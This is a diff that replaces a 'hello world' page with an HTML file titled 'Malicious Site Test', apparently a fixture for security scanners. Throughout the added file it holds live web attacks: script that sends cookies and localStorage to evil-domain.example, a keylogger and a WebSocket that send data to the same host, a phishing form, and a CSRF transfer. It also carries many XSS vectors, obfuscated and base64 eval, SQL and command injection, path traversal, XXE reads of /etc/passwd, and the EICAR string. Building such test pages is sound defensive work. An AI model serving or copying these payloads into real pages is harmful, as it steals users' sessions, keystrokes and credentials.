@@ -1,1 +1,143 @@
-<h1>hello world.</h1>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Site Test</title>
+    <meta http-equiv="refresh" content="5;url=javascript:alert('XSS via meta refresh')" />
+    <script>
+        // Basic XSS payload
+        alert("XSS Test");
+        
+        // Simulated data exfiltration
+        var stolen_data = {
+            cookies: document.cookie,
+            location: window.location.href,
+            localStorage: JSON.stringify(localStorage)
+        };
+        
+        // Attempt to send data to malicious domain
+        fetch('https://evil-domain.example/exfil', {
+            method: 'POST',
+            body: JSON.stringify(stolen_data)
+        });
+        
+        // Simulated keylogger
+        document.addEventListener('keypress', function(e) {
+            new Image().src = 'https://evil-domain.example/log?key=' + e.key;
+        });
+        
+        // DOM-based XSS
+        document.write("<img src='x' onerror='alert(\"DOM-based XSS\")'>");
+        
+        // Eval-based execution (often flagged)
+        eval('alert("Eval-based execution")');
+        
+        // Simulated iframe injection
+        var iframe = document.createElement('iframe');
+        iframe.src = 'javascript:alert(document.domain)';
+        document.body.appendChild(iframe);
+    </script>
+    <style>
+        body {
+            background-image: url('javascript:alert("CSS-based XSS")');
+        }
+        @import 'javascript:alert("Import-based XSS")';
+    </style>
+</head>
+<body onload="alert('Event handler XSS')">
+    <h1>Malicious Test Page</h1>
+    
+    <!-- Various XSS vectors -->
+    <div><script>alert('Inline script XSS')</script></div>
+    <img src="x" onerror="alert('Image onerror XSS')">
+    <iframe src="javascript:alert('IFrame src XSS')"></iframe>
+    <svg><script>alert('SVG Script XSS')</script></svg>
+    <math><mtext><script>alert('MathML XSS')</script></mtext></math>
+    
+    <!-- HTML contexts -->
+    <div onclick="alert('Click event XSS')">Click me for XSS</div>
+    <a href="javascript:alert('Link href XSS')">Malicious Link</a>
+    
+    <!-- SQL Injection simulation -->
+    <a href="/?id=1' OR '1'='1">SQL Injection Test</a>
+    
+    <!-- Command Injection simulation -->
+    <a href="/cmd.php?cmd=cat%20/etc/passwd">Command Injection Test</a>
+    
+    <!-- Directory traversal simulation -->
+    <a href="/include.php?file=../../../etc/passwd">Path Traversal Test</a>
+    
+    <!-- EICAR test string (antivirus test) -->
+    <div id="eicar" style="display:none">X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</div>
+    
+    <!-- Malicious form for data collection -->
+    <form action="https://evil-domain.example/steal" method="post">
+        <input type="text" name="username" placeholder="Username" value="admin' --">
+        <input type="password" name="password" placeholder="Password" value="' OR '1'='1">
+        <button type="submit">Login</button>
+    </form>
+    
+    <!-- Encoded malicious content -->
+    <div>&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x45;&#x6E;&#x63;&#x6F;&#x64;&#x65;&#x64;&#x20;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;</div>
+    
+    <!-- Obfuscated JavaScript -->
+    <script>
+        (function() {
+            var a = ['fromCharCode', 'eval', 'String', 'replace', 'constructor'];
+            var b = function(c, d) {
+                return c[a[4]][a[0]](d);
+            };
+            var e = 'alert("Obfuscated XSS")';
+            window[a[1]](e);
+        })();
+    </script>
+    
+    <!-- Base64 encoded JavaScript -->
+    <script>
+        eval(atob('YWxlcnQoIkJhc2U2NCBYU1MiKQ=='));
+    </script>
+    
+    <!-- Protocol resolution bypass -->
+    <iframe src="//evil-domain.example/xss.js"></iframe>
+    
+    <!-- Data URI exploitation -->
+    <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiRGF0YSBVUkkgWFNTIik8L3NjcmlwdD4=">Data URI XSS</a>
+    
+    <!-- WebSocket XSS vector -->
+    <script>
+        var ws = new WebSocket('ws://evil-domain.example/socket');
+        ws.onopen = function() {
+            ws.send(document.cookie);
+        };
+    </script>
+    
+    <!-- OWASP cheatsheet examples -->
+    <img src="javascript:alert('XSS via image src')">
+    <img src="JaVaScRiPt:alert('XSS via mixed case')">
+    <div><img src="1" onerror="alert('Error handler XSS')"></div>
+    
+    <!-- Reflected File Download attack pattern -->
+    <a href="/download?file=malicious.bat&contents=echo%20MALICIOUS%20%26%26%20calc">Malicious Download</a>
+
+    <!-- HTML injection -->
+    <svg><animate xlink:href="#xss" attributeName="href" values="javascript:alert(1)"></animate><a id="xss"><text x="20" y="20">Click me</text></a>
+    
+    <!-- Shellshock-like pattern -->
+    <img src="x" alt="() { :; }; echo vulnerable">
+    
+    <!-- XXE-like pattern -->
+    <xml>
+      <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <input value="&xxe;">
+    </xml>
+    
+    <!-- CSRF-like pattern -->
+    <img src="x" style="display:none" onerror="fetch('https://victim-site.com/api/transfer', {
+      method: 'POST',
+      credentials: 'include',
+      body: JSON.stringify({to: 'attacker', amount: 1000})
+    })">
+    
+    <!-- CSP bypass attempt -->
+    <script nonce="whatever" src="data:text/javascript,alert('CSP bypass')"></script>
+</body>
+</html>
